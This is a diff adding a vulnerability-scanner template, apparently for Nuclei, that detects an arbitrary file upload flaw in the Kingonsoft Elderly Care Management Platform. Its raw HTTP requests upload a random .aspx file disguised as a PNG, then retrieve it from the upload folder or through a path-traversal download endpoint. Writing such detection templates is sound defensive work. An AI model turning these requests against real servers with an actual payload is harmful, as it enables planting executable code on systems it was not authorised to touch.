@@ -1,0 +1,54 @@
+id: kingonsoft-secmp-uploads-anyfile-upload
+info:
+  name: Kingonsoft Elderly Care Management Platform Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    This template detects an arbitrary file upload vulnerability in the Kingonsoft Elderly Care Management Platform.
+http:
+  - raw:
+      - |
+        POST /Mobile/Uploads HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=---------------------------45250802924973458471174811279
+
+        -----------------------------45250802924973458471174811279
+        Content-Disposition: form-data; name="file"; filename="{{random_str}}.aspx"
+        Content-Type: image/png
+
+        {{base64_content}}
+        -----------------------------45250802924973458471174811279
+    extractors:
+      - type: regex
+        name: uploaded_file_path
+        part: body
+        internal: true
+        regex:
+          - "([a-zA-Z0-9_/]+\\.aspx)"
+  - raw:
+      - |
+        GET /Content/Upload/{{current_year}}{{current_month}}/{{current_day}}/{{random_str}}.aspx HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{base64_content}}"
+    matchers-condition: or
+  - raw:
+      - |
+        GET /DevApi/DownFile?FileName=../Content/Upload/{{current_year}}{{current_month}}/{{current_day}}/{{random_str}}.aspx HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{base64_content}}"
+    matchers-condition: or
+variables:
+  random_str: '{{rand_base(5)}}'
+  base64_content: '{{base64(rand_text_alpha(10))}}'
+  current_year: '{{date_time("2006")}}'
+  current_month: '{{date_time("01")}}'
+  current_day: '{{date_time("02")}}'
